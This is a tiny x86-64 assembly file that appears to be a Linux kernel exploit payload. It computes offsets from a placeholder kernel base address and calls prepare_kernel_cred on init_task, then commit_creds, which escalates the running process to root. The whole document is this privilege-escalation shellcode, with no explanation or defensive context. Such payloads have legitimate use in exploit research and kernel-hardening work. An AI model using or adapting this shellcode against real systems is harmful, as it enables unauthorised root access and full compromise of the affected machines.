BITS 64

push rbx

mov rbx, [rel kernelbase]

lea rdi, [rbx+0x2a0c980] ; init_task
lea rax, [rbx+0x10bc400] ; prepare_kernel_cred
call rax

mov rdi, rax
lea rax, [rbx+0x10bc170] ; commit_creds
call rax

pop rbx
ret

kernelbase: dq 0x4141414141414141
